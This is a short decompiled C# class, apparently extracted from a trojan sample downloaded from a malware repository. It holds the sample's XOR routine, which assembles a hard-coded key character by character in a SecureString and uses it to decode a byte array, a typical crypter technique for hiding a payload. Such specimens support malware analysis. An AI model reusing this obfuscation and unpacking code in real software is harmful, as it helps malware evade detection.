// Decompiled with JetBrains decompiler
// Type: e52a71747iaa0aa11.ae940a96aau033902
// Assembly: e52a71747iaa0aa11, Version=2.1.0.0, Culture=neutral, PublicKeyToken=cac503e1823ce71c
// MVID: 0D894068-CF68-44D1-88F9-023D8A694267
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan.MSIL.Crypt.gen-32d8b52e3461f3cf3cd3f6811df29ca82987bb597ad104f4ff2e7064dbd625ad.exe

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

namespace e52a71747iaa0aa11
{
  public class ae940a96aau033902
  {
    [CompilerGenerated]
    public byte[] \u003C795euu7u0429199o1\u003E(byte[] _param1)
    {
      SecureString s = new SecureString();
      s.AppendChar('6');
      s.AppendChar('7');
      s.AppendChar('a');
      s.AppendChar('b');
      s.AppendChar('c');
      s.AppendChar('@');
      s.AppendChar('.');
      s.AppendChar('c');
      s.AppendChar('o');
      s.AppendChar('T');
      s.AppendChar('r');
      s.AppendChar('u');
      s.AppendChar('m');
      s.AppendChar('p');
      s.AppendChar('2');
      s.AppendChar('3');
      s.AppendChar('4');
      s.AppendChar('5');
      IntPtr bstr = Marshal.SecureStringToBSTR(s);
      byte[] numArray1 = new byte[checked (s.Length - 1 + 1)];
      int num1 = checked (s.Length - 1);
      int ofs = 0;
      while (ofs <= num1)
      {
        numArray1[ofs] = Marshal.ReadByte(bstr, ofs);
        checked { ++ofs; }
      }
      byte[] numArray2 = new byte[checked (_param1.Length - 1 + 1)];
      int num2 = checked (_param1.Length - 1);
      int index = 0;
      while (index <= num2)
      {
        numArray2[index] = checked ((byte) ((int) numArray1[unchecked (index % numArray1.Length)] ^ (int) _param1[index]));
        checked { ++index; }
      }
      return numArray2;
    }
  }
}
